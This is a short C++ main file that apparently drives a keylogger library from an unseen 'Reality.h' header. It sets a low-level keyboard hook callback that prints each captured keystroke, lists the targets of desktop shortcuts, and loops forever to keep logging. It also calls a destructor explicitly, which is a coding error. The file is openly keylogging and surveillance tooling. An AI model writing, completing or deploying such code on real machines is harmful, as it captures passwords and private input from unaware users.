#include "Reality.h"

#include <iostream>

int	main(int argc, char** argv) {
	std::function<void(PKBDLLHOOKSTRUCT)> klCallback = [] (PKBDLLHOOKSTRUCT key) { std::cout << Keylogger::vkCodesAll[key->vkCode] << " "; };
	Keylogger kl(klCallback);

	Miscellaneous misc;
	std::vector<std::string> files;
	misc.GetAllShortcutsTargetFromDesktop(files);
	for(auto& file : files) {
		std::cout << file << std::endl;
	}
	misc.~Miscellaneous();

	while(true) {
		kl.Update();
	}

	return 0;
}